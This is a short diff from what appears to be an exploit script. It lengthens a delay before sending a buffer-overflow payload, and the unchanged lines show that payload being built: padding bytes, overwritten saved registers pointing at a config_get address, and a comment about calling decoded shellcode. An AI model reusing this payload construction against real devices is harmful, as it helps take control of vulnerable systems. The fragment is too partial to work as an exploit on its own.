@@ -823,7 +823,7 @@ elif args.command == 'http':
         #### then call the decoded shellcode
         payload = b'b' * 132
 
-        time.sleep(1) # sleep before sending so the caches get flushed
+        time.sleep(10) # sleep before sending so the caches get flushed
 
         payload += p32(s0) # s0 (config_get address)
         payload += p32(s1) # s1 (address of 0x1010200)
